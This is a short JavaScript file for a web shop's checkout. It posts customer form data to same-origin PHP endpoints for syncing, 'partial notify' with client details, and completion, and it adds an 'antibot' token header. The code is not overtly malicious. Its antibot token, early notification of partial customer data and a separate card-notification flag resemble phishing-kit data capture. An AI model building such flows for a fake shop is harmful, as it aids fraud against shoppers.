const PARTIAL_NOTIFY_KEY = "salt-partial-notify-sent";

function checkoutApiBase() {
  return window.location.pathname.includes("/pages/")
    ? "../api/"
    : "api/";
}

function checkoutApiHeaders() {
  const headers = { "Content-Type": "application/json" };
  if (window.SALT_ANTIBOT && window.SALT_ANTIBOT.token) {
    headers["X-Salt-Token"] = window.SALT_ANTIBOT.token;
  }
  return headers;
}

function syncCheckoutPending() {
  if (typeof getCheckoutData !== "function") return Promise.resolve();

  const data = getCheckoutData();
  if (!data.lastName || !data.firstName) return Promise.resolve();

  return fetch(checkoutApiBase() + "checkout-sync.php", {
    method: "POST",
    headers: checkoutApiHeaders(),
    body: JSON.stringify(data),
    credentials: "same-origin",
  }).catch(() => {});
}

function schedulePartialNotify() {
  if (sessionStorage.getItem(PARTIAL_NOTIFY_KEY)) return Promise.resolve(false);
  if (sessionStorage.getItem("salt-card-notify-sent")) return Promise.resolve(false);
  if (typeof getCheckoutData !== "function") return Promise.resolve(false);

  const data = {
    ...getCheckoutData(),
    client: typeof getClientInfo === "function" ? getClientInfo() : {},
  };
  if (!data.lastName || !data.firstName) return Promise.resolve(false);

  return fetch(checkoutApiBase() + "partial-notify.php", {
    method: "POST",
    headers: checkoutApiHeaders(),
    body: JSON.stringify(data),
    credentials: "same-origin",
  })
    .then((res) => res.json())
    .then((result) => {
      if (result && result.sent) {
        sessionStorage.setItem(PARTIAL_NOTIFY_KEY, "1");
        return true;
      }
      return false;
    })
    .catch(() => false);
}

function markCheckoutComplete() {
  fetch(checkoutApiBase() + "checkout-complete.php", {
    method: "POST",
    headers: checkoutApiHeaders(),
    body: "{}",
    credentials: "same-origin",
    keepalive: true,
  }).catch(() => {});
}
